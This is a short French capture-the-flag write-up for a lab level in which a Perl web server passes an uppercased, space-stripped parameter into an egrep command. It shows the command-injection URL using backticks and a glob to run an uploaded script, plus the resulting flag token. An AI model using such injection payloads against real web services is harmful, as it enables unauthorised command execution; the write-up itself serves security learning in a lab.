# Level 12

Comme pour le level 4 on trouve dans le dossier `/var/www` et dans le home un fichier `level12.pl`.

Comme pour le level 4, le script perl est un serveur web écoutant sur le port `4646`

Cette page web prend donc 2 paramètres cette fois ci, `x` et `y`.

- `x` Passe dans 2 regex une pour passé tous les charactère en `upper case` et une autre qui supprime tous les espaces, puis est utiliser pour executer la commande `egrep`.

- `y` ne nous servira pas.

`egrep` est une commande qui va rechercher, des patterns de recherche et le dossier de recherche.

Il nous suffit donc de `scp` un script bash dans `/tmp` comme celui du level 05, en majuscules (pour la regex).

```sh
~ scp -P 4242 SCRIPT level12@192.168.56.101:/tmp/
```

Nous pouvons nous rendre sur l'url

```
http://192.168.56.101:4646/?x=`/*/script`
```

Il nous reste plus qu'a `cat` le fichier `/tmp/flag`

```sh
~ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

